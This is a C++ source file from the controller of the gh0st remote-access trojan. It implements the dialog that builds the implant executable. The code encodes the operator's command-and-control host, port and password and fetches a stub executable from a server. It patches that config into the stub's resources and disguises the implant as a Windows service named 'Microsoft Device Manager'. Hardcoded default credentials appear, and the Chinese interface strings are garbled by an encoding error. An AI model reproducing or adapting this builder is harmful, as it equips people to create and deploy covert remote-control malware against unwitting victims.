// SettingsView.cpp : implementation file
//

#include "stdafx.h"
#include "gh0st.h"
#include "SettingsView.h"
#include "encode.h"
#include "MainFrm.h"
#include "..\Public.h"
#include "zlib/zlib.h"

#ifdef _DEBUG
#define new DEBUG_NEW
#undef THIS_FILE
static char THIS_FILE[] = __FILE__;
#endif

extern CMainFrame	*g_pFrame;
extern CIOCPServer	*m_iocpServer;

/*
enum
{
	PROXY_NONE,
	PROXY_SOCKS_VER4 = 4,
	PROXY_SOCKS_VER5	
};

struct socks5req1
{
    char Ver;
    char nMethods;
    char Methods[2];
};

struct socks5ans1
{
    char Ver;
    char Method;
};

struct socks5req2
{
    char Ver;
    char Cmd;
    char Rsv;
    char Atyp;
    unsigned long IPAddr;
    unsigned short Port;
    
	//    char other[1];
};

struct socks5ans2
{
    char Ver;
    char Rep;
    char Rsv;
    char Atyp;
    char other[1];
};

struct authreq
{
    char Ver;
    char Ulen;
    char NamePass[256];
};

struct authans
{
    char Ver;
    char Status;
};
*/

#define Request_DOWN			0x9
#define File_Buffer				0x10
#define File_Buffer_Finish		0x11

#define WM_PROMPT_MESSAGEBOX    WM_USER + 0x0001

typedef struct
{
	BYTE	Flags;
	DWORD	Buffer_Size;
	BYTE	Buffer[1024];
}NET_DATA, *LPNET_DATA;

/////////////////////////////////////////////////////////////////////////////
// CSettingsView

IMPLEMENT_DYNCREATE(CSettingsView, CFormView)

CSettingsView::CSettingsView()
	: CFormView(CSettingsView::IDD)
{
	//{{AFX_DATA_INIT(CSettingsView)
	m_remote_host = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString(TEXT("Connection"), TEXT("Host"), TEXT(""));
    m_remote_port = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetString(TEXT("Connection"), TEXT("Port"), TEXT("80"));
    m_listen_port = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt(TEXT("Settings"), TEXT("ListenPort"), 80);
    m_max_connections = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt(TEXT("Settings"), TEXT("MaxConnection"), 8000);
    m_connect_auto = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt(TEXT("Settings"), TEXT("MaxConnectionAuto"), 0);
    m_bIsDisablePopTips = ((CGh0stApp *)AfxGetApp())->m_IniFile.GetInt(TEXT("Settings"), TEXT("PopTips"), false);
	m_bIsSaveAsDefault = FALSE;
	m_encode = _T("");
	m_ServiceDisplayName = _T("");
	m_ServiceDescription = _T("");
	m_pass = _T("");
	m_username = _T("");
	m_userpass = _T("");
	m_bFirstShow = true;
	m_delete = FALSE;
	//}}AFX_DATA_INIT
}

CSettingsView::~CSettingsView()
{
}

void CSettingsView::PromptMessageBox(const CString& msg)
{
    CString* pString = new CString(msg);
    PostMessage(WM_PROMPT_MESSAGEBOX, 0, (LPARAM)pString);
    //AfxMessageBox(msg);
}

void CSettingsView::DoDataExchange(CDataExchange* pDX)
{
	CFormView::DoDataExchange(pDX);
	//{{AFX_DATA_MAP(CSettingsView)
	DDX_Text(pDX, IDC_REMOTE_HOST, m_remote_host);
	DDX_Text(pDX, IDC_REMOTE_PORT, m_remote_port);
	DDX_Text(pDX, IDC_LISTEN_PORT, m_listen_port);
	DDV_MinMaxUInt(pDX, m_listen_port, 1, 50000);
	DDX_Text(pDX, IDC_CONNECT_MAX, m_max_connections);
	DDV_MinMaxUInt(pDX, m_max_connections, 1, 100000);
	DDX_Check(pDX, IDC_CONNECT_AUTO, m_connect_auto);
	DDX_Check(pDX, IDC_DISABLE_POPTIPS, m_bIsDisablePopTips);
	DDX_Check(pDX, IDC_SAVEAS_DEFAULT, m_bIsSaveAsDefault);
	DDX_Text(pDX, IDC_ENCODE, m_encode);
	DDX_Text(pDX, IDC_SerName, m_ServiceDisplayName);
	DDX_Text(pDX, IDC_SerMS, m_ServiceDescription);
    USES_CONVERSION;
	DDX_Text(pDX, IDC_PASS, CString(A2W(m_pass)));
	DDX_Text(pDX, IDC_username, m_username);
	DDX_Text(pDX, IDC_userpass, m_userpass);
	DDX_Check(pDX, IDC_Delete, m_delete);
	//}}AFX_DATA_MAP
}


BEGIN_MESSAGE_MAP(CSettingsView, CFormView)
	//{{AFX_MSG_MAP(CSettingsView)
	ON_CONTROL_RANGE(EN_CHANGE, IDC_REMOTE_HOST, IDC_PROXY_PASS, OnChangeConfig)
	ON_BN_CLICKED(IDC_RESETPORT, OnResetport)
	ON_BN_CLICKED(IDC_CONNECT_AUTO, OnConnectAuto)
	ON_BN_CLICKED(IDC_CHECK_AUTH, OnCheckAuth)
	ON_BN_CLICKED(IDC_TEST_PROXY, OnTestProxy)
	ON_BN_CLICKED(IDC_CHECK_PROXY, OnCheckProxy)
	ON_BN_CLICKED(IDC_TEST_MASTER, OnTestMaster)
	ON_BN_CLICKED(IDC_DISABLE_POPTIPS, OnDisablePoptips)
	ON_BN_CLICKED(IDC_SAVEAS_DEFAULT, OnSaveasDefault)
	ON_BN_CLICKED(IDC_ShengCheng, OnShengCheng)
	ON_EN_CHANGE(IDC_PASS, OnChangePass)
    ON_MESSAGE(WM_PROMPT_MESSAGEBOX, OnPromptMessageBox)
	//}}AFX_MSG_MAP
END_MESSAGE_MAP()

/////////////////////////////////////////////////////////////////////////////
// CSettingsView diagnostics

#ifdef _DEBUG
void CSettingsView::AssertValid() const
{
	CFormView::AssertValid();
}

void CSettingsView::Dump(CDumpContext& dc) const
{
	CFormView::Dump(dc);
}
#endif //_DEBUG

/////////////////////////////////////////////////////////////////////////////
// CSettingsView message handlers

void CSettingsView::OnChangeConfig(UINT id)
{
	UpdateData();

	CString str = m_remote_host + _T(":") + m_remote_port;
	if ( m_pass.GetLength() != 0 )
	{
		str += _T("|");
		str += m_pass;
	}
	str.MakeLower();
    USES_CONVERSION;
	m_encode = A2W(MyEncode(W2A(str.GetBuffer(0))));
	m_encode.Insert(0, _T("AAAA"));
	m_encode += _T("AAAA");
	UpdateData(FALSE);
}

void CSettingsView::OnActivateView(BOOL bActivate, CView* pActivateView, CView* pDeactiveView) 
{
	// TODO: Add your specialized code here and/or call the base class

	if (m_bFirstShow)
	{
		if (m_remote_host.GetLength() == 0)
		{
			char hostname[256]; 
			gethostname(hostname, sizeof(hostname));
			HOSTENT *host = gethostbyname(hostname);
			if (host != NULL)
				m_remote_host = inet_ntoa(*(IN_ADDR*)host->h_addr_list[0]);
			else
				m_remote_host = _T("192.168.16.2");	
		}
		m_delete = TRUE;
		UpdateData(false);


		UpdateProxyControl();
		OnConnectAuto();

		// �����ִ�
		OnChangeConfig(0);
		int	nEditControl[] = {IDC_LISTEN_PORT, IDC_CONNECT_MAX, IDC_REMOTE_HOST, IDC_REMOTE_PORT, 
			IDC_PROXY_HOST, IDC_PROXY_PORT, IDC_PROXY_USER, IDC_PROXY_PASS, IDC_ENCODE};
		for (int i = 0; i < sizeof(nEditControl) / sizeof(int); i++)
			m_Edit[i].SubclassDlgItem(nEditControl[i], this);

        //ʵ�ʵ�IDD_SETTINGS�Ի���û��IDΪIDC_TEST_PROXY�Ŀؼ�������ע�͵���by zhangyl
        //int	nBtnControl[] = {IDC_RESETPORT, IDC_TEST_MASTER, IDC_TEST_PROXY};
		int	nBtnControl[] = {IDC_RESETPORT, IDC_TEST_MASTER/*, IDC_TEST_PROXY*/};

		for (int i = 0; i < sizeof(nBtnControl) / sizeof(int); i++)
		{
			m_Btn[i].SubclassDlgItem(nBtnControl[i], this);
			m_Btn[i].SetColor(CButtonST::BTNST_COLOR_FG_IN, RGB(255, 0, 0));
		}

 		if (((CGh0stApp *)AfxGetApp())->m_bIsQQwryExist)
 			SetDlgItemText(IDC_SYSTEM_TIPS, _T("�ҵ�IP���ݿ��ļ�: QQWry.Dat"));
 		else
 			SetDlgItemText(IDC_SYSTEM_TIPS, _T("û���ҵ�IP���ݿ��ļ�QQWry.Dat �뽫���ļ�����������ͬĿ¼������ʾ����˵���λ��"));
	}

	m_bFirstShow = false;

	SetDlgItemText(IDC_SerName, 
		((CGh0stApp *)AfxGetApp())->m_IniFile.GetString(_T("Build"), _T("DisplayName"), _T("Microsoft Device Manager")));
	SetDlgItemText(IDC_SerMS, 
		((CGh0stApp *)AfxGetApp())->m_IniFile.GetString(_T("Build"), _T("Description"), _T("���ͼ�����Ӳ���豸���Զ������豸����")));

	CFormView::OnActivateView(bActivate, pActivateView, pDeactiveView);
}

void CSettingsView::OnResetport() 
{
	// TODO: Add your control notification handler code here
	int prev_port = m_listen_port;
	int prev_max_connections = m_max_connections;

	UpdateData(TRUE);

	if (prev_max_connections != m_max_connections)
	{
		if (m_connect_auto)
			InterlockedExchange((LPLONG)&m_iocpServer->m_nMaxConnections, 8000);
		else
			InterlockedExchange((LPLONG)&m_iocpServer->m_nMaxConnections, m_max_connections);
	}

	if (prev_port != m_listen_port)
		g_pFrame->Activate(m_listen_port, m_iocpServer->m_nMaxConnections);

	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "ListenPort", m_listen_port);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "MaxConnection", m_max_connections);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt("Settings", "MaxConnectionAuto", m_connect_auto);
}

void CSettingsView::OnConnectAuto() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
	GetDlgItem(IDC_CONNECT_MAX)->EnableWindow(!m_connect_auto);
}

void CSettingsView::OnCheckAuth() 
{
	// TODO: Add your control notification handler code here
	UpdateProxyControl();
}

void CSettingsView::OnCheckProxy() 
{
	// TODO: Add your control notification handler code here
	UpdateProxyControl();
}


void CSettingsView::OnTestMaster() 
{
	// TODO: Add your control notification handler code here
	UpdateData();
	if (!m_remote_host.GetLength() || !m_remote_port.GetLength())
	{
		AfxMessageBox(_T("���������������Ϣ"));
		return;
	}
	
	HANDLE	hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestMaster, this, 0, NULL);
	CloseHandle(hThread);
}

void CSettingsView::OnTestProxy() 
{
	// TODO: Add your control notification handler code here
}


void CSettingsView::UpdateProxyControl()
{
}

DWORD WINAPI CSettingsView::TestProxy( LPVOID lparam )
{

	return 0;
}

unsigned WINAPI CSettingsView::ConnectToServerProc(LPVOID lParam)
{
    CSettingsView* pThis = (CSettingsView*)lParam;
    if (pThis == NULL)
        return 0;
    
    //////////////////////////////////////////////////////////////////////////////////////////////////
    char TmpPath[MAX_PATH];
    GetTempPathA(sizeof(TmpPath), TmpPath);
    lstrcatA(TmpPath, "HACKFANSSC.exe");
    DeleteFileA(TmpPath);
    DWORD recvsize = 0;
    SOCKET sockInt;
    struct sockaddr_in serverAddr;
    //struct hostent *hp;
    WORD sockVersion;
    WSADATA wsaData;
    sockVersion = MAKEWORD(2, 2);
    //TODO: ��Щ��ʼ���ͷ���ʼ������Ӧ��ȥ������ǰ�����Ѿ�ʹ����IOCP����Ȼ�Ѿ���ʼ����socket��
    WSAStartup(sockVersion, &wsaData);
    //����SOCK
    sockInt = socket(AF_INET, SOCK_STREAM, 0);
    if (sockInt == INVALID_SOCKET)
    {
        pThis->PromptMessageBox(_T("socket error!\n"));
        WSACleanup();
        return 0;
    }

    //��ȡ������IP�Ͷ˿�
    serverAddr.sin_family = AF_INET;
    char tgtIP[30] = { 0 };
    struct hostent *hp = NULL;
    if ((hp = gethostbyname(/*fkjpgt.3322.org*/"127.0.0.1")) != NULL)
    {
        in_addr in;
        memcpy(&in, hp->h_addr, hp->h_length);
        lstrcpyA(tgtIP, inet_ntoa(in));
    }

    serverAddr.sin_addr.s_addr = inet_addr(tgtIP);

    //==begin added by zhangyl 2017.10.17
    CIniFile iniFile;
    int	nPort = iniFile.GetInt(TEXT("Settings"), TEXT("ListenPort"));
    serverAddr.sin_port = htons(nPort);
    //==end added by zhangyl 2017.10.17
    //serverAddr.sin_port = htons(8813);

    //���ӷ���
    if (connect(sockInt, (struct sockaddr *)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR)
    {
        pThis->PromptMessageBox(_T("���ӷ�����ʧ��!\n"));
        //AfxMessageBox(_T("���ӷ�����ʧ��!\n"));
        WSACleanup();
        return 0;
    }
    char USERIMFOR[256] = { 0 }, sendbuf[256] = { 0 };
    char bPacketFlag[] = { 'F', 'K', 'J', 'P', '3' };
    //wsprintfA(USERIMFOR, "Login:%s@%s", CStringA(m_username), CStringA(m_userpass));
    //Сд��g ASCII����103
    wsprintfA(USERIMFOR, "g:%s@%s", CStringA(pThis->m_username), CStringA(pThis->m_userpass));
    char compressBuf[256] = { 0 };
    uLongf destLength = sizeof(compressBuf);
    int	nRet = compress((Bytef*)compressBuf, &destLength, (const Bytef*)USERIMFOR, strlen(USERIMFOR));
    if (nRet != Z_OK)
    {
        pThis->PromptMessageBox(_T("ѹ������ʧ��!\n"));
        //AfxMessageBox(_T("ѹ������ʧ��!\n"));
        WSACleanup();
        return 0;
    }
    int packetSize = sizeof(bPacketFlag) + 2 * sizeof(int) + destLength;
    int nUnCompressLength = strlen(USERIMFOR);
    memcpy(sendbuf, bPacketFlag, sizeof(bPacketFlag));
    memcpy(sendbuf + sizeof(bPacketFlag), &packetSize, sizeof(packetSize));
    memcpy(sendbuf + sizeof(bPacketFlag) + sizeof(packetSize), &nUnCompressLength, sizeof(nUnCompressLength));
    memcpy(sendbuf + sizeof(bPacketFlag) + sizeof(packetSize) + sizeof(nUnCompressLength), compressBuf, destLength);
    if (send(sockInt, sendbuf, packetSize, 0) != packetSize)
    {
        pThis->PromptMessageBox(_T("��������ʧ��!\n"));
        //AfxMessageBox(_T("��������ʧ��!\n"));
        WSACleanup();
        return 0;
    }

    char buff[256] = { 0 };
    int Ret = recv(sockInt, buff, sizeof(buff), NULL);
    if (Ret == 0 || Ret == SOCKET_ERROR)
    {
        pThis->PromptMessageBox(_T("��¼ʧ��!"));
        //AfxMessageBox(_T("��¼ʧ��!"));
        WSACleanup();
        return 0;
    }
    if (strstr(buff, "Logined") != NULL)//ͨ����֤
    {
        //		DeleteFile(dlg.GetPathName());
        if (GetFileAttributesA(TmpPath) != -1)
        {
            pThis->PromptMessageBox(_T("File is exist and can't delete!"));
            //AfxMessageBox(_T("File is exist and can't delete!"));
            WSACleanup();
            return 0;
        }

        NET_DATA MyData;
        DWORD dwBytes;
        HANDLE hFile = CreateFileA(TmpPath, GENERIC_WRITE, FILE_SHARE_WRITE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
        BYTE request[256] = { 0 };
        request[0] = Request_DOWN;
        char *laji = "48f9648";

        if (pThis->m_pass.GetLength() != 0)
        {
            lstrcpyA((char*)&request[1], pThis->m_pass.GetBuffer(0));
        }
        send(sockInt, (char*)&request, sizeof(request), NULL);
        while (1)
        {
            memset(&MyData, 0, sizeof(NET_DATA));
            Ret = recv(sockInt, (char*)&MyData, sizeof(MyData), NULL);
            if (Ret == 0 || Ret == SOCKET_ERROR)
            {
                pThis->PromptMessageBox(_T("��ȡ�ļ�����!"));
                //AfxMessageBox(_T("��ȡ�ļ�����!"));
                CloseHandle(hFile);
                WSACleanup();
                return 0;
            }
            if (MyData.Flags != File_Buffer_Finish && MyData.Flags != File_Buffer) break;
            WriteFile(hFile, MyData.Buffer, MyData.Buffer_Size, &dwBytes, NULL);
            recvsize += MyData.Buffer_Size;
            send(sockInt, laji, lstrlenA(laji) + 1, NULL);
            if (MyData.Flags == File_Buffer_Finish) break;
        }
        CloseHandle(hFile);
    }
    else
    {
        WSACleanup();
        return 0;
    }

    //�ر�SOCK
    closesocket(sockInt);
    WSACleanup();
    /////////////////////���ϵĴ���ӷ�������ȡ�� Dat�ļ������� ����ĩβ�����һ��������Ϣ //////////////////////////

    char ENCODE[1025] = { 0 };
    {
        USES_CONVERSION;
        lstrcpyA(ENCODE, W2A(FindConfigString(TmpPath, _T("WCCCRX"))));
    }

    HANDLE hUpdate = BeginUpdateResourceA(TmpPath, false);
    if (!hUpdate)
    {
        //AfxMessageBox(_T("����ʱʧ��"));
        pThis->PromptMessageBox(_T("����ʱʧ��"));
        DeleteFileA(TmpPath);
        return 0;
    }
    if (!UpdateResourceA(hUpdate, "INFORMATION", MAKEINTRESOURCEA(IDR_ENCODE), 0, ENCODE, lstrlenA(ENCODE) + 1))
    {
        CloseHandle(hUpdate);
        pThis->PromptMessageBox(_T("����ʱʧ��"));
        //AfxMessageBox(_T("����ʱʧ��"));
        DeleteFileA(TmpPath);
        return 0;
    }
    if (!UpdateResourceA(hUpdate, "INFORMATION", MAKEINTRESOURCEA(IDR_CONFIG), 0, pThis->m_strServiceConfig.GetBuffer(0), pThis->m_strServiceConfig.GetLength() + 1))
    {
        CloseHandle(hUpdate);
        pThis->PromptMessageBox(_T("����ʱʧ��"));
        //AfxMessageBox(_T("����ʱʧ��"));
        DeleteFileA(TmpPath);
        return 0;
    }
    EndUpdateResource(hUpdate, false);
    if (pThis->m_pathName.IsEmpty())
        return 0;

    DeleteFile(pThis->m_pathName);
    {
        USES_CONVERSION;
        MoveFile(A2W(TmpPath), pThis->m_pathName);
    }
    pThis->PromptMessageBox(_T("�����ļ��ɹ�����������ߡ�"));
    
    //AfxMessageBox(_T("�����ļ��ɹ�����������ߡ�"));

    CFile file;
    if (file.Open(pThis->m_pathName, CFile::modeWrite))
    {
        try
        {
            file.SeekToEnd();
            //file.Write(lpData, dwResLen);
            // д��6��'A',��װʱ����
            file.Write("AAAAAA", 6);
            file.Write(pThis->m_encode, pThis->m_encode.GetLength() + 1);
            // д��6��'C',�Ƿ�������ƺ�����
            file.Write("WCCCJS", 6);
            file.Write(pThis->m_strServiceConfig, pThis->m_strServiceConfig.GetLength() + 1);
            file.Close();
            pThis->PromptMessageBox(_T("�ļ�����ɹ������üӿ��������ѹ�� -:)"));
            //AfxMessageBox(_T("�ļ�����ɹ������üӿ��������ѹ�� -:)"));
        }
        catch (...)
        {
            DeleteFile(pThis->m_pathName);
            //MessageBox(_T("�ļ�����ʧ�ܣ�����"), _T("��ʾ"), MB_OK | MB_ICONSTOP);
            pThis->PromptMessageBox(_T("�ļ�����ʧ�ܣ�����"));
        }
    }
    //FreeResource(hResData);

    return 1;
}

DWORD WINAPI CSettingsView::TestMaster( LPVOID lparam )
{
	CSettingsView	*pThis = (CSettingsView *)lparam;
	CString	strResult;
	bool	bRet = true;
	WSADATA	wsaData;
	WSAStartup(0x0201, &wsaData);

	SOCKET	sRemote = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sRemote == SOCKET_ERROR)
	{ 
		AfxMessageBox(_T("socket ��ʼ��ʧ��"));
		return false;
	}
	// ����socketΪ������
	u_long argp	= 1;
	ioctlsocket(sRemote, FIONBIO, &argp);

	struct timeval tvSelect_Time_Out;
	tvSelect_Time_Out.tv_sec = 3;
	tvSelect_Time_Out.tv_usec = 0;

	hostent* pHostent = NULL;
    USES_CONVERSION;
	pHostent = gethostbyname(W2A(pThis->m_remote_host));
	if (pHostent == NULL)
	{
		bRet = false;
		goto fail;
	}

	// ����sockaddr_in�ṹ
	sockaddr_in	ClientAddr;
	ClientAddr.sin_family	= AF_INET;
    ClientAddr.sin_port = htons(atoi(W2A(pThis->m_remote_port)));
	
	ClientAddr.sin_addr = *((struct in_addr *)pHostent->h_addr);
	
	connect(sRemote, (SOCKADDR *)&ClientAddr, sizeof(ClientAddr));

	fd_set	fdWrite;
	FD_ZERO(&fdWrite);
	FD_SET(sRemote, &fdWrite);
	
	if (select(0, 0, &fdWrite, NULL, &tvSelect_Time_Out) <= 0)
	{	
		bRet = false;
		goto fail;
	}
fail:
	closesocket(sRemote);
	WSACleanup();

	if (bRet)
		strResult.Format(_T("�ɹ��򿪵�����%s�����ӣ� �ڶ˿� %s: ���ӳɹ�"), pThis->m_remote_host, pThis->m_remote_port);
	else
		strResult.Format(_T("���ܴ򿪵�����%s�����ӣ� �ڶ˿� %s: ����ʧ��"), pThis->m_remote_host, pThis->m_remote_port);
	AfxMessageBox(strResult);
	return -1;	
}

void CSettingsView::OnDisablePoptips() 
{
	// TODO: Add your control notification handler code here
	UpdateData();
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetInt(_T("Settings"), _T("PopTips"), m_bIsDisablePopTips);
	((CGh0stApp *)AfxGetApp())->m_bIsDisablePopTips = m_bIsDisablePopTips;
}

void CSettingsView::OnSaveasDefault() 
{
	// TODO: Add your control notification handler code here
	OnChangeConfig(0);
}

int memfind(const char *mem, const char *str, int sizem, int sizes)   
{   
	int   da,i,j;   
	if (sizes == 0) da = strlen(str);   
	else da = sizes;   
	for (i = 0; i < sizem; i++)   
	{   
		for (j = 0; j < da; j ++)   
			if (mem[i+j] != str[j])	break;   
			if (j == da) return i;   
	}   
	return -1;   
}

#define	MAX_CONFIG_LEN	1024//��-1024�ĵط���ʼ��ȡ��������
LPCTSTR FindConfigString(char *strFileName, LPCTSTR lpString)
{
	char	*lpConfigString = NULL;
	DWORD	dwBytesRead = 0;

	HANDLE	hFile = CreateFileA(strFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return NULL;
	}

	SetFilePointer(hFile, -MAX_CONFIG_LEN, NULL, FILE_END);
	lpConfigString = new char[MAX_CONFIG_LEN];
	ReadFile(hFile, lpConfigString, MAX_CONFIG_LEN, &dwBytesRead, NULL);
	CloseHandle(hFile);
	
    USES_CONVERSION;
	int offset = memfind(lpConfigString, W2A(lpString), MAX_CONFIG_LEN, 0);
	if (offset == -1)
	{
		delete lpConfigString;
		return NULL;
	}
	else
	{
        return A2W(lpConfigString) + offset;
	}
}

void CSettingsView::OnShengCheng() 
{
	// TODO: Add your control notification handler code here
	UpdateData(true);
	if (m_ServiceDisplayName.IsEmpty() || m_ServiceDescription.IsEmpty())
	{
		AfxMessageBox(_T("��������д������ʾ���ƺ����� -:("));
		return;
	}
	if ( m_username.GetLength() == 0 || m_userpass.GetLength() == 0 )
	{
		//AfxMessageBox(_T("��������д�û��������� -:("));
		//return;
        m_username = _T("zhangyl");
        m_userpass = _T("123");
	}
	// ��������
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString(_T("Build"), _T("DisplayName"), m_ServiceDisplayName);
	((CGh0stApp *)AfxGetApp())->m_IniFile.SetString(_T("Build"), _T("Description"), m_ServiceDescription);

	//CString		strServiceConfig;
    USES_CONVERSION;
    m_strServiceConfig.Format(_T("%s|%s"), A2W(MyEncode(W2A(m_ServiceDisplayName.GetBuffer(0)))),
        A2W(MyEncode(W2A(m_ServiceDescription.GetBuffer(0)))));

	if ( m_delete )
	{
        m_strServiceConfig += "()";
	}
	
	CFileDialog dlg(FALSE, _T("exe"), _T("server.exe"), OFN_OVERWRITEPROMPT, _T("��ִ���ļ�|*.exe"), NULL);
	if(dlg.DoModal () != IDOK)
		return;

    m_pathName = dlg.GetPathName();

    //TODO: �߳̽���ʱ���ر��߳̾��hThread
    UINT	dwThreadId = 0;
    HANDLE hThread =
        (HANDLE)_beginthreadex(NULL,				// Security
        0,					// Stack size - use default
        ConnectToServerProc,  // Thread fn entry point
        (void*) this,
        0,					// Init flag
        &dwThreadId);	// Thread address

    //TODO: ���²���Ӧ�����¿����߳�
	//AfxMessageBox(_T("���ӷ�������ȡ�ļ���ʱ������,�����ĵȴ�...\n���\"ȷ��\"����"));
	/*
	HINSTANCE	hInstance;
	HRSRC		hResInfo;
	DWORD		dwResLen;
	HGLOBAL		hResData;
	LPBYTE		lpData;
	hInstance = AfxGetApp()->m_hInstance;
	hResInfo = FindResource(hInstance, (LPCTSTR)IDR_BSS, (LPCTSTR)"BSS");
	dwResLen = SizeofResource(hInstance, hResInfo);
	hResData = LoadResource(hInstance, hResInfo);
	lpData = (LPBYTE)LockResource(hResData);
	*/
}

void CSettingsView::OnChangePass()
{
	// TODO: Add your control notification handler code here
	OnChangeConfig(0);
}

LRESULT CSettingsView::OnPromptMessageBox(WPARAM wParam, LPARAM lParam)
{
    CString* pStr = (CString*)lParam;
    if (pStr == NULL)
        return 0;

    AfxMessageBox(*pStr);

    delete pStr;
    return 1;
}
